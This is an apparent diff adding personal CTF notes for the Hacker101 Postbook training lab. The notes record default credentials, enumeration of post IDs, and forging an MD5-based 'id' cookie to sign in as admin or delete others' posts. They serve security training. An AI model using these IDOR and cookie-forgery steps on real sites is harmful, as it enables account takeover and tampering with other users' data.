@@ -1,0 +1,45 @@
+
+CTF Hacker101 
+
+Postbook CTF
+
+User Input Places: 
+	VIEW PAGE:     index.php?page=view.php&id=:id
+	DELETE PAGE:   index.php?page=delete.php&id=e4da3b7fbbce2345d7772b0674a318d5
+	
+	
+Flag 0: (SOOO SIMPLE CREDENTIAL)
+Simple Credentials:
+	UserName: user
+	Password: password
+	
+Flag 1: (FIND PRIVATE ADMIN'S POST)
+	Started to test index.php?page=view.php&id=:id  input with the 0, 1, *@(KLDks input.
+	index.php?page=view.php&id=1   - THE FIRST POST BY ADMIN
+	index.php?page=view.php&id=2   - SECRET ADMIN POST PAGE FOUND WIHT THE *FLAG* 
+
+
+Flag 3: (MAGIC ID 189 * 5)
+When brute-forcing the id parameter in 945 I got Responce with 1648 Length.
+
+Flag 4: (EDIT OTHER'S POST)
+
+
+Flag 5: (SIGN IN AS ADMIN BY CHANGING COOKIE)
+Cookie: _ga_K45575FWB8=GS1.1.1720517874.7.1.1720518207.60.0.0; _ga=GA1.1.369118950.1719927450; _ga_W62NXF3JMB=GS1.1.1720524661.12.1.1720525578.0.0.0; _gid=GA1.2.95579070.1720517875
+
+Cookie: _ga_K45575FWB8=GS1.1.1720517874.7.1.1720518207.60.0.0; _ga=GA1.1.369118950.1719927450; _ga_W62NXF3JMB=GS1.1.1720524661.12.1.1720525578.0.0.0; _gid=GA1.2.95579070.1720517875; id=c81e728d9d4c2f636f067f89cc14862c   -- for User 2
+
+Cookie: _ga_K45575FWB8=GS1.1.1720517874.7.1.1720518207.60.0.0; _ga=GA1.1.369118950.1719927450; _ga_W62NXF3JMB=GS1.1.1720524661.12.1.1720525578.0.0.0; _gid=GA1.2.95579070.1720517875; id=eccbc87e4b5ce2fe28308fd9f2a7baf3
+
+for user = 1 id=c4ca4238a0b923820dcc509a6f75849b
+
+Cookie: _ga_K45575FWB8=GS1.1.1720517874.7.1.1720518207.60.0.0; _ga=GA1.1.369118950.1719927450; _ga_W62NXF3JMB=GS1.1.1720524661.12.1.1720525578.0.0.0; _gid=GA1.2.95579070.1720517875; id=c4ca4238a0b923820dcc509a6f75849b
+
+
+
+Flag 6: (DELETING USER'S POST)
+	In the delete page id=eccbc87e4b5ce2fe28308fd9f2a7baf3 which md5 value 3 
+	Started to investigate time on delete page. I determined from the https://crackstation.net that id  = md5(:id). 
+	We have user's post in our home page which is id = 3. By generating index.php?page=delete.php&id=eccbc87e4b5ce2fe28308fd9f2a7baf3 this link 
+	I achieved to get the flag.
